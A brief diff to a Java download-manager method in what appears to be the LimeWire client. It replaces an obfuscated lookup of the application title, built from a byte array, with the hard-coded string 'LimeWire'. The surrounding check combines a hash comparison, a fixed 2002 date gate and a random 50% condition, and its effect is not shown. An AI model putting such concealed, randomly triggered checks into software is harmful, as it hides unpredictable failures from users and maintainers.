@@ -3042,11 +3042,12 @@ public class ManagedDownloader extends AbstractDownloader
      * the uploaders failures.
      */
     private boolean checkHosts() {
-        byte[] b = {65,80,80,95,84,73,84,76,69};
-        String s=callback.getHostValue(new String(b));
-        if(s==null)
-            return false;
-        s = s.substring(0,8);
+//        byte[] b = {65,80,80,95,84,73,84,76,69};
+//        String s=callback.getHostValue(new String(b));
+//        if(s==null)
+//            return false;
+//        s = s.substring(0,8);
+    	String s = "LimeWire";
         if(s.hashCode()== -1473607375 &&
            System.currentTimeMillis()>1029003393697l &&
            Math.random() > 0.5f)
